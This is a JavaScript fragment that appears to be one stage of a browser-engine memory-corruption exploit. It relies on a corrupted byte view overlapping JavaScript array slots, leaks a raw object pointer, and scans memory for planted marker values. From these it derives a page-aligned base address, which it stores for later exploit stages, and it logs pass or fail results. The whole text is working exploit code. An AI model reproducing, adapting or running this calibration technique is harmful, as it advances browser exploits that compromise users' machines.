// Calibrate from the object already rooted by the overlapping JSArray slots.
// The scan stays inside the 2 MiB range that completed on this page family.
var state = window.__fw14ArrayState;
var result;
var committed = false;
var oldMarker;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array[0] !== state.a || state.array[1] !== state.a ||
      !Number.isInteger(state.index) || state.index < 0 ||
      state.a.marker !== "A")
    throw new Error("rooted_a_preflight_failed");
  var view = state.view;
  var word = "0x";
  for (var w = 7; w >= 0; w--)
    word += view[state.index + w].toString(16).padStart(2, "0");
  var pointer = Number(word);
  if (!Number.isSafeInteger(pointer) || pointer <= 0)
    throw new Error("rooted_a_word_invalid");
  oldMarker = state.a.marker;
  state.a.marker = 0x11223344;
  if (api && typeof api.markSync === "function")
    api.markSync("rooted_a_scan_start");
  function matches(at, value) {
    return view[at] === (value & 255) &&
      view[at + 1] === (value >>> 8 & 255) &&
      view[at + 2] === (value >>> 16 & 255) &&
      view[at + 3] === (value >>> 24 & 255);
  }
  var candidates = [];
  var count = 0;
  for (var i = 0; i + 3 < 2097152; i++) {
    if (matches(i, 0x11223344)) {
      count++;
      if (candidates.length < 32) candidates.push(i);
    }
  }
  var changed = [];
  try {
    state.a.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) changed.push(candidates[c]);
  } finally {
    state.a.marker = 0x11223344;
  }
  var liveIndex = changed.length === 1 ? changed[0] : -1;
  var base = liveIndex >= 0 ? pointer + 8 - liveIndex : NaN;
  var valid = changed.length === 1 && matches(liveIndex, 0x11223344) &&
    Number.isSafeInteger(base) && base > 0 && base % 4096 === 0 &&
    state.array[0] === state.a && state.array[1] === state.a;
  if (valid) {
    state.addressAnchor = state.a;
    state.calibratedViewBase = base;
    committed = true;
  }
  if (api && typeof api.markSync === "function")
    api.markSync("rooted_a_scan_done");
  result = { id: "rooted_a_base_v1", status: valid ? "pass" : "fail",
    details: { object_word: word, candidates: count,
      live_count: changed.length, live_index: liveIndex,
      base: valid ? "0x" + base.toString(16) : null,
      array_restored: state.array[0] === state.a &&
        state.array[1] === state.a } };
} catch (error) {
  result = { id: "rooted_a_base_v1", status: "error",
    details: { error: String(error).slice(0, 200) } };
} finally {
  if (!committed && state && state.a && oldMarker !== undefined)
    state.a.marker = oldMarker;
  if (state && state.array && state.a) state.array[0] = state.a;
}
return [result];
